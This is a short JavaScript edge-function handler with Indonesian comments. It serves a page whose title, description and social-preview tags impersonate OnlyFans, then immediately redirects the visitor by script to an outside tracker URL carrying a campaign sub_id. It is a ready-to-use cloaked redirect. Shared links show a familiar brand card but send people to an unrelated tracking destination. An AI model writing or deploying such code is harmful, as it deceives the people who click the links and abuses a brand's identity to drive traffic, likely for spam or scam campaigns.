export async function onRequest(context) {

  // ambil URL yang dibuka user (auto og:url)
  const url = new URL(context.request.url);
  const currentUrl = url.href;

  // ganti ke URL tujuan kamu
  const redirectUrl = "https://tracker.statis.click/lord?sub_id=LORD_BAR_2";

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<title>OnlyFans</title>

<meta name="description" content="Discover exclusive content and connect with your favorite creators.">

<meta property="og:title" content="OnlyFans">
<meta property="og:site_name" content="OnlyFans">
<meta property="og:description" content="Discover exclusive content and connect with your favorite creators.">
<meta property="og:image" content="https://static.android.com.pl/uploads/2021/08/OnlyFans.jpg">
<meta property="og:url" content="${currentUrl}">
<meta property="og:type" content="website">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="OnlyFans">
<meta name="twitter:description" content="Discover exclusive content and connect with your favorite creators.">
<meta name="twitter:image" content="https://static.android.com.pl/uploads/2021/08/OnlyFans.jpg">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
window.location.replace("${redirectUrl}");
</script>

</head>
<body>
</body>
</html>`;

  return new Response(html, {
    headers: {
      "content-type": "text/html; charset=UTF-8",
      "cache-control": "no-cache, no-store, must-revalidate"
    }
  });

}
